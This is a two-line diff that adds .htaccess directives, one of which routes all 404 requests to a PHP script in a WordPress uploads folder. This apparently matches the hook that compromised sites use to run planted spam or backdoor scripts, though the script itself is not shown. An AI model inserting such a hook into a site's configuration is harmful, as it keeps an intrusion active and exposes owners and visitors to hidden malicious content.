@@ -1,0 +1,2 @@
+Options -MultiViews
+ErrorDocument 404 //n/wp-content/uploads/links.php
